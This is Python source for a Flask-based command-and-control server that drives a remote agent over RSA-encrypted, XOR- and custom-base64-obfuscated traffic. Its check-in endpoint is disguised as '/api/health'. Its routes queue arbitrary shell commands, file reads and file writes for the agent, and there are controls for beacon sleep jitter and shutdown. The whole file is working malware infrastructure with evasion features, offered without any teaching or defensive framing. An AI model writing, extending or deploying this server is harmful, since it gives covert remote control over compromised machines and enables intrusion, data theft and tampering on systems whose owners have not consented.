from flask import Flask, request, jsonify
import json
import os
import base64
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend


# Obfuscation Keys
CUSTOM_ABC = "zxywvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA0123456789-_"
STD_ABC    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
XOR_KEY    = "C2_SECRET_KEY"


def custom_b64_e(data):
   if isinstance(data, str): data = data.encode()
   encoded = base64.b64encode(data).decode().replace('=', '')
   return encoded.translate(str.maketrans(STD_ABC, CUSTOM_ABC))


def custom_b64_d(data):
   decoded = data.translate(str.maketrans(CUSTOM_ABC, STD_ABC))
   return base64.b64decode(decoded + '=' * (-len(decoded) % 4)).decode()


def xor_data(data):
   return ''.join(chr(ord(data[i]) ^ ord(XOR_KEY[i % len(XOR_KEY)])) for i in range(len(data))).encode().hex()


def xor_decode(hex_data):
   data = bytes.fromhex(hex_data).decode()
   return ''.join(chr(ord(data[i]) ^ ord(XOR_KEY[i % len(XOR_KEY)])) for i in range(len(data)))


# RSA Key Management
def _init_server_keys():
   try:
       with open('server_private_key.pem', 'rb') as f:
           priv = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
       with open('server_public_key.pem', 'rb') as f:
           pub = serialization.load_pem_public_key(f.read(), backend=default_backend())
   except FileNotFoundError:
       priv = rsa.generate_private_key(65537, 2048, default_backend())
       pub = priv.public_key()
       with open('server_private_key.pem', 'wb') as f:
           f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
       with open('server_public_key.pem', 'wb') as f:
           f.write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
   return priv, pub


agent_public_key = None
SERVER_PRIVATE_KEY, SERVER_PUBLIC_KEY = _init_server_keys()
tasks = {"agent": []}


app = Flask(__name__)


# Standardized error response
def error_response(code, message, request_id=None, status_code=400):
   return jsonify({"status": "ERROR", "code": code, "message": message, "request_id": request_id}), status_code


def encrypt_for_agent(data):
   global agent_public_key
   if agent_public_key is None: raise Exception("Agent public key not available")
   if isinstance(data, str): data = data.encode()
   enc = agent_public_key.encrypt(data, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))
   return base64.b64encode(enc).decode()


def decrypt_from_agent(enc_data):
   dec = SERVER_PRIVATE_KEY.decrypt(base64.b64decode(enc_data), padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))
   return dec.decode()


# beacon endpoint for agent check-in and task retrieval
@app.route('/api/health', methods=['POST'])
def beacon():
   global agent_public_key
   request_id = None
   try:
       key_header = request.headers.get('X-Agent-Key')
       if key_header:
           agent_pub_pem = custom_b64_d(key_header)
           agent_public_key = serialization.load_pem_public_key(agent_pub_pem.encode(), backend=default_backend())


       raw = decrypt_from_agent(request.json.get('data'))
       data = json.loads(raw)
       request_id = data.get('r')
      
       task_out = None
       if tasks["agent"]:
           t = tasks["agent"].pop(0)
           task_out = {
               "c": xor_data(t["command"]), # XOR obfuscated cmd
               "r": t["request_id"],
               "p": t.get("params", {})
           }
      
       resp = {"r": request_id, "t": task_out}
       return jsonify({"data": encrypt_for_agent(json.dumps(resp))})
   except Exception as e:
       return error_response(400, str(e), request_id=request_id)


# endpoint for agent to report results back to server
@app.route('/api/report', methods=['POST'])
def result():
   request_id = None
   try:
       data = json.loads(decrypt_from_agent(request.json.get('data')))
       agent_id = data.get('a')
       request_id = data.get('r')
       output = custom_b64_d(data.get('o'))
       print(f"\nRESULT from {agent_id} (Req: {request_id}):\n{output}\n")
       return jsonify({"status": "received", "request_id": request_id})
   except Exception as e:
       return error_response(400, str(e), request_id=request_id)


def queue_task(cmd, params=None):
   rid = os.urandom(4).hex()
   tasks["agent"].append({"command": cmd, "request_id": rid, "params": params or {}})
   return rid


# tasks
@app.route('/api/run_cmd', methods=['POST'])
def run_cmd():
   rid = queue_task("RUN_CMD", {"cmd": request.json.get('cmd')})
   return jsonify({"status": "RUN_CMD queued", "request_id": rid})


@app.route('/api/read_data', methods=['POST'])
def read_data():
   rid = queue_task("READ_DATA", {"path": request.json.get('filepath')})
   return jsonify({"status": "READ_DATA queued", "request_id": rid})


@app.route('/api/write_data', methods=['POST'])
def write_data():
   rid = queue_task("WRITE_DATA", {"path": request.json.get('filepath'), "val": request.json.get('content')})
   return jsonify({"status": "WRITE_DATA queued", "request_id": rid})


# controls
@app.route('/api/set_sleep', methods=['POST'])
def set_sleep():
   rid = queue_task("SET_SLEEP", {"min": request.json.get('min', 5), "max": request.json.get('max', 10)})
   return jsonify({"status": "SET_SLEEP queued", "request_id": rid})


@app.route('/api/shutdown', methods=['POST'])
def shutdown():
   rid = queue_task("SHUTDOWN")
   return jsonify({"status": "SHUTDOWN queued", "request_id": rid})


if __name__ == "__main__":
   app.run(host="0.0.0.0", port=3000)